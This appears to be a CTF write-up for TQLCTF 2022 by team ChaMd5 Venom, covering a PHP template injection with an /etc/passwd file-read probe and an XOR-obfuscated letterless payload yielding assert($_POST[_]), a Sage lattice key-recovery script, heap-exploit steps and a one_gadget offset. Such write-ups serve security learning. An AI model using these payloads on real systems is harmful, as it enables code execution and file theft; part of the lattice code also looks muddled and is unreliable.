---
title: TQLCTF WriteUp - ChaMd5 Venom
contest: TQLCTF
year: 2022
team: ChaMd5 Venom
difficulty: medium
vuln_type: web_unknown
tags: [php-lfi, php-template-write, xor-rce, lattice-attack, nesemu-exploit]
attack_chain:
- /get_pic.php?image=/etc/passwd LFI
- 注册 + 4 字段写入 sandbox/<md5(user)>.php
- user=1)/* website=*/;__PUNC__/* punctuation=无字母数字 RCE
- $_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`')='assert'
- $__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']')='_POST'
- $_($___[_]) → assert($_POST[_])
- Lattice attack: 128 维 IntegerLattice LLL reduce + Gram-Schmidt
- grad_desc(0.7, 128, samples) 梯度下降 4 维找 4 个短向量
- babai pklll gram pkgram target 还原私钥
- pwn menu: add/delete + size 负数 + 伪造 fake_chunk 0x70
- tcache stash unlink + main_arena leak
- 'nemu' 调试器: 写 0x86A3FC0 地址到 libc 区域 + og=0x4527a one_gadget
- 'edit_score' race 改 write_time
key_payload: assert($_POST[_])  // 无字母 RCE
one_liner: TQLCTF 2022 ChaMd5 Venom：PHP 无字母 RCE + 128 维 lattice + Nemu 调试器栈迁移。
lesson: LLL + 梯度下降 4 维可以恢复 lattice 私钥的 4 个基向量；pwnable 中 nesemu 是稀有 IoT 模拟。
quality: medium
---
# TQLCTF WriteUp - ChaMd5 Venom

## Web - Simple PHP
- 注册 4 字段：user / pass / website / punctuation
- 写入 `sandbox/<md5(user)>.php`
- `/get_pic.php?image=/etc/passwd` 存在 LFI
- template 中 `__USER__/__PASS__/__WEBSITE__/__PUNC__` 占位符
- 注入链:
  - `user = 1)/*` (闭合原 `if($_COOKIE['user']===$user)`)
  - `website = */;__PUNC__/*` (注释掉后续并引入 PUNC)
  - `punctuation` 经 `preg_replace("/[a-z,A-Z,0-9>?]/", "", ...)` 过滤
  - 用 XOR 绕过：`$_=('%01'^'`')...='assert'; $__='_POST'; $_($___[_]);`

```php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // 'assert'
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // '_POST'
$___=$$__;
$_($___[_]); // assert($_POST[_])
```

## Crypto - Lattice 私钥恢复
```python
from sage.modules.free_module_integer import IntegerLattice

class grad_desc:
    def __init__(self, delta, n, ss):
        self.n = n; self.delta = delta; self.samples = ss; self.nsamples = ss.nrows()
    def gen_vector(self, n, i):
        vec = [0] * n; vec[i] = 0.85; return vector(RR, vec)
    def mom4(self, w): return (1/self.nsamples) * sum([x^4 for x in (self.samples*w)])
    def grad_mom4(self, w):
        return (4/self.nsamples) * sum([dot^(3)*vi for (dot,vi) in zip((self.samples*w), self.samples)])
    def run(self, pos):
        slow = self.delta * 10^-3
        w_new = self.gen_vector(self.n, pos); w_new /= norm(w_new)
        while 1:
            w = w_new
            g = self.grad_mom4(w)
            w_new = w - self.delta * g
            w_new /= norm(w_new)
            if self.mom4(w_new) - self.mom4(w) > -slow:  # 注意 slow = positive
                pass  # actually slow is subtracted
            if self.mom4(w) - self.mom4(w_new) < slow:
                return w

def babai(lattice, gram, target):
    t = target
    for i in reversed(range(lattice.nrows())):
        c = ((t * gram[i]) / (gram[i] * gram[i])).round()
        t -= lattice[i] * c
    return target - t

pk = load("pk"); sigs = load("signatures")
pklll = IntegerLattice(pk, lll_reduce=True).reduced_basis
pkgram = pklll.gram_schmidt()[0]

# 128 维 sample 矩阵 + 梯度下降 4 次找 4 个短向量
# 每次 babai 还原 PKLL 基
```

## Pwn - menu
```python
# add(0x90, p64(0)*3 + p64(0x400))
# add(0x280, 'init-0')
# for i in range(16):
#     add(i*0x10+0xa0, (p64(0)+p64(0)+p64(0)+p64(0x21)+(p64(0)+p64(0x61))*((i*0x10+0x70)/0x10)))
# delete(-0x290)  # 负数 size 绕过
# fake_t = p16(7)*8*3  # 伪造 fake chunk
# add(0x280, fake_t)  # 触发 main_arena leak
# add(0x90, 'a')  # 拿到 unsorted bin
```

## Pwn - nemu 调试器
- 用 nemu 调试其他程序
- leak 0x86A3FC0 地址 + og=libc_base+0x4527a (one_gadget)
